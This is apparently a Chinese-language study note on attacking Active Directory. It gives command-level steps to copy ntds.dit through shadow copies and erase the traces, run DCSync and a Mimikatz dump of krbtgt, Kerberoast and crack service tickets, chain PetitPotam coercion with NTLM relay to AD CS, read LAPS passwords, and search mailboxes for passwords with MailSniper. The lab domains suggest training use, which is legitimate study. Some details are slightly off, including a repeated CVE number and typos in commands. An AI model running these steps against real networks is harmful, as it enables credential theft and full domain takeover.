---
date: 2025-12-7
---

# AD域介绍

> 域(Domain)是网络中独立的单位，之间访问需要建立信赖关系。
> ad域 由域控添加用户和计算机，用户在受信任的计算机上登录

# 信息收集

## 主机信息

```cmd
ipconfig /all 			#查ip dns一般为dc
systeminfo 				#补丁 domain信息
net time /domain 		#确认链接
net config workstation   #计算机名，用户名，工作站
whoami 					# 权限 sid 组
```

## 用户/组

```cmd
net user /domain		#域内用户
net user <username> /domain #指定域用户信息
```

# 域控渗透

### 获取所有域成员用户

### ntds.dit

NT Directory Services Database。存储域用户，域计算机，域组，域信任对象
位置C:\Windows\NTDS\ntds.dit。
windows中，为了保护磁盘文件，被占用的文件不能直接复制。ntds.dit 被lsass占用，不能复制。
需要用到VSS(Volumn shadow copy service)。卷影复制服务。复制卷。

ntdsutil.exe。ntdsutil.exe是Windows操作系统为管理活动目录专门提供的命令行工具，维护和管理活动目录数据库、创建快照、创建应用程序目录和分区等
```powershell
ntdsutil snapshot "list all" quit quit  # 查看当前快照
ntdsutil snapshot "list mounted" quit quit  # 查看当前已加载的快照
ntdsutil snapshot "activate instance ntds" create quit quit #记录ntds所在快照的guid
ntdsutil snapshot "mount f0c60a0a-3220-4943-86d6-900788897e32" quit quit
加载到C:\$SNAP_202605292200_VOLUMEC$\

ntds.dit文件位于
C:\$SNAP_202605292200_VOLUMEC$\windows\ntds\ntds.dit,可以使用如下命令进行复制。
copy C:\$SNAP_202605292200_VOLUMEC$\windows\ntds\ntds.dit c:\ntds.dit

```
```powershell
reg save hklm\system c:\system.hive 
```
>痕迹删除

```powershell
ntdsutil snapshot "unmount {f0c60a0a-3220-4943-86d6-900788897e32}" quit quit
ntdsutil snapshot "delete {f0c60a0a-3220-4943-86d6-900788897e32}" quit quit
```

>diskshadow

```powershell
set context persistent nowriters    # 设置卷影拷贝
add volume c: alias myAlias    #快照目标是磁盘c
create     # 创建快照
expose %myAlias% z:    #将其分配至盘符z
exec "c:\windows\system32\cmd.exe" /c copy z:\Windows\NTDS\ntds.dit c:\  #导出
delete shadows all    # 删除快照
list shadows all    # 列出系统中的卷影拷贝
reset   # 退出
exit

```
```
diskshadow.exe /s cmd.txt
```
### DCSync
不同的域控制器之间，每隔15分钟就会进行一次域数据同步。如果域控制器DC-1想从域控制器DC-2获取数据，就会向域控制器DC-2发送一个GetNCChanges 请求；域控制器 DC-2收到请求后，会将相关数据同步给域控制器DC-1

攻击者可以在拥有域控制器管理权限的基础上，无须登录域控制器，远程向域控制器请求所有域用户的用户名和密码散列值.

# 跨域
跨森林攻击（Cross-Forest Attack）是指攻击者在攻陷一个域或森林后，利用森林信任（Forest Trust）或外部信任（External Trust）关系，进一步获取另一个森林中的权限。
## 森林枚举

查看信任关系：

>PowerView：

```
Get-DomainTrust -Domain ms08067.cn  

([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

>ActiveDirectory模块：

```
Get-ADTrust -Filter *
```

>命令行：

```
nltest /domain_trusts
```

## SqlServer 连接

mssql 服务可跨域/森林创建连接。
先看域中有哪些mssql服务器，转入服务器查看是否有链接。
```powershell
setspn -T dev -Q MSSQLSvc/*  //枚举域中的mssql服务器
#spn是域标识服务的唯一标识。
-T 指定域
-Q 查询MSSALSvc开头的成员服务器。
mssql服务器的一般spn：`MSSQLSvc/SRV01.dev.local:1433`
```
## Kerberoast 

```powershell[powerview]
//枚举
Get-DomainTrust | ?{ $_.TrustAttributes 
-band [System.DirectoryServices.ActiveDirectory.TrustAttribute]::ForestTransitive } | %{ Get-DomainUser -SPN -Domain $_.TargetName }
```
```powershell
Get-ADTrust -Filter 'IntraForest -ne $true' | ForEach-Object {
    Get-ADUser -Filter {ServicePrincipalName -ne $null} -Properties ServicePrincipalName -Server $_.Name
}
```

```powershell
//s请求一个TGS
. Rubeus.exe kerberoast /user:IISUser /simple /domain:ms08o67.hk /outfile:IISUser.txt

//破解
john IISUser.txt --wordlist=Tools/pwd.txt
```

## 外部安全主体
FSP，Foreign Security Principal，来自其他域/森林的安全主体
```powershell
Find-ForeignGroup -Domain ms08067.hk |
ForEach-Object {
    $_ | Add-Member `
        -NotePropertyName Identity `
        -NotePropertyValue (ConvertFrom-SID $_.MemberName) `
        -Force

    $_
}
//枚举 `ms08067.hk` 域中的跨域组成员（Foreign Group Member），然后把 SID 解析成人类可读的 `DOMAIN\User` 格式
```

## 利用ACL

## 单森林
### PetitPotam
PetitPotam 是一种利用 Windows MS-EFSRPC（Encrypting File System Remote Protocol） 的 NTLM 身份认证强制触发（NTLM Coercion）技术，
这个问题是由EfsRpc API的EfsRpcOpenFileRawO函数的路径检查不完整导致的，攻击者可以在fileName参数中传递任何值，如攻击者的IP地址，以强制目标主机发起认证。
这种攻击的理想目标就是能够接受NTLM验证的服务器，如安装了Web Enrollment Roles角色的Active Directory Certificate Services(AD CS)。

（1）使用PetitPotam强制域控制器向攻击主机发起认证。
（2）将认证请求转发到CA，为域控制器请求一个证书。
（3）在攻击主机上使用NTLM中继捕获创建的证书。
（4）使用证书请求TGT，进行权限提升。
> NTLM relay

```powershell
ntlmrelayx.py \
-t http://ca01.ms08067.cn/certsrv/certfnsh.asp \
-smb2support \
--adcs \
--template DomainController
```
> 强制认证

```powershell
这里需要设置两个参数，一个是攻击主机的IP地址，另一个是域控制器的IP地址
PatitPotam.py 192.168.3.116 192.168.3.10
```
> 将TGT注入内存

```powershell
Rubeus.exe asktgt /user:CN-DC01$ /ptt /dc:192.168.3.10 /domain:ms08067.cn /certificate: MIIRZQIBAzCCER8GCSqGSIb3DQEHAaCCERAEghEM..
```
>DCsync获取krbtgt

```powershell
使用Mimikatz：
lsadmp::dcsync /domain:ms08067.cn /user:ms08067\krbtgt
```
### proxyNotShell

目标环境中有Exchange服务器
ProxyNotShell是一个利用链。
> CVE-2022-41040

ExchangeAutodiscover前端的一个无须认证的SSRF漏洞。
以LocalSystem权限向后端的任意URL发送数据

> CVE-2022-41040

ExchangePowerShell后端的远程代码执行漏洞

### NotProxyShell
> 第一个漏洞为OWASSRF

该漏洞是一个服务器端请求伪造漏洞，使认证用户可以通过OWA接口访问后端的任意接口，如/powershell。

> 第二个漏洞为TabShell

该漏洞是后端PowerShell接口的一个沙箱逃逸漏洞。攻击者可利用该漏洞执行任意cmdlet。攻击者如果获得了一个低权限域用户的凭据，就可以利用TabShell进行权限提升

### 权限滥用
#### Backup Operators
Backup Operators（备份操作员）组的成员可以备份和恢复计算机上所有的文件，而不需要考虑这些文件的权限是什么，也可以登录和关闭计算机，但该组不能被重命名、删除或者移动。
在默认情况下，Backup Operators这个内置的组没有成员
>使用BackupOperatorToolkit提取 SAM、SECURITY和SYSTEM文件

```powershell
.\BackupOperatorToolkit.exe DUMP c:\ \\dev-DC01.dev.ms08067.cn
```
#### LAPS
本地管理员密码解决方案（Local Admin Password Solution，LAPS）
为了避免多个主机的admin使用相同的密码，laps让每个计算机自己更新admin密码，放到ad中。
LAPS密码以明文形式存储在计算机对象的ms-Mcs-AdmPwd属性中，密码过期时间存储在ms-Mcs-AdmPwdExpirationTime属性中，其传输过程是加密的（由Kerberos实现）。

明文密码的读取权限是由ACL控制的，默认只有域管理员有权读取明文密码

启用了LAPS的计算机，其C:\Program Files\LAPS\CSE\目录下会有一个AdmPwd.dll文件。
powerview:
``` powershell 
枚举可以读取LAPS明文密码的用户或组
Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | Where-Object {($_.ObjectAceType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')}  | ForEach-Object ($_ | Add-Member NoteProperty IdentityName'  $(Convert-SidToName $_.SecurityIdentifier):$_}

```
```powershell
查看对应OU下的主机列表
//powerview:
(Get-DomainOU -Identity 'DEvComputers').distinguishedname | %{Get-DomainComputer -SearchBase $_} | select name
```
```powershell
//powerview
Get-DomainObject -Identity APPSRV01$ | select -ExpandProperty ms-mcs-admpwd 
Get-DomainObject -Identity WIN10$ | select -ExpandProperty ms-mcs-admpwd
```
####  共享文档权限
管理员会配置一些共享目录来存储企业或者部门的共享文档、软件等。如果攻击者对共享目录有写权限，就可以将原来的程序替换成后门程序
```powershell
//powerview
只列出当前用户可以访问的域共享目录。
Find-DomainShare -CheckShareAccess -verbose

//跨森林进行枚举。
Find-DomainShare -CheckShareAccess -Domain ms08067.hk
```

#### Exchange权限
* 部分组的权限可以被利用
  如 Exchange Servers、Exchange Trusted Subsystem、Exchange Windows Permissions等
* 错误配置
  导致部分用户可以读取其他用户邮箱的内容，而邮箱中可能包含用户密码等敏感信息

DomainAdmins组、Enterprise Admins组、Organization Management 组、Exchange Trusted Subystem 组、Exchange Servers 组可以访问所有用户的邮箱。

>查看当前用户邮箱中是否有敏感信息
```powershell
//MailSniper:
Invoke-SelfSearch -Mailbox dave@ms08067.cn -Terms "*密码*", "*password*"
```
>邮件导出，并保存到本地
```powershell
//MailSniper:
Invoke-SelfSearch -Mailbox dave@ms08o67.cn -Terms "*密码*","*password*" -OutputCsv
```
>枚举其他当前用户有读权限
```powershell
//MailSniper:
Get-GlobalAddressList -ExchHostname exch.ms08067.cn -UserName dev\dave -Password Passw0rd@02 -OutFile email.txt
```
>列出当前用户有权限访问哪些邮箱。
```powershell
$secureString = ConvertTo-SecureString -String "Password@02" -AsPlainText -Force 

$UserCredential = New-Object System.Management.Automation.PSCredential -ArgumentList "dev\dave",$secureString 

Invoke-OpenInboxFinder -ExchHostname mail.ms08o67.cn -EmailList .\email.txt -AccessToken $UserCredential -ExchangeVersion Exchange2019
```

#### 组策略对象权限
组策略对象(Group Policy Object，GPO)
创建者有Edit settings，delete，modify security权限
GPO 的优先级为 Organization Unit > Domain > Site > Local

如果由攻击者控制的账户本身或者其所在的组有权限修改GPO，攻击者就可以利用这个漏洞进行权限提升。
>枚举当前用户可以读取、删除或者修改的GPO
```powershell
Get-DomainGPO  | Get-ObjectAcl -ResolveGUIDs | Foreach-Object {$_ | Add-Member -NotePropertyName Identity -NotePropertyValue  (ConvertFrom-SID
$_.SecuRityIdentifier.value) -Force; $_} | Foreach-Object {if ($_.Identity -eq 
$("$env:UserDomain\$env:Username"))  {$_}}
```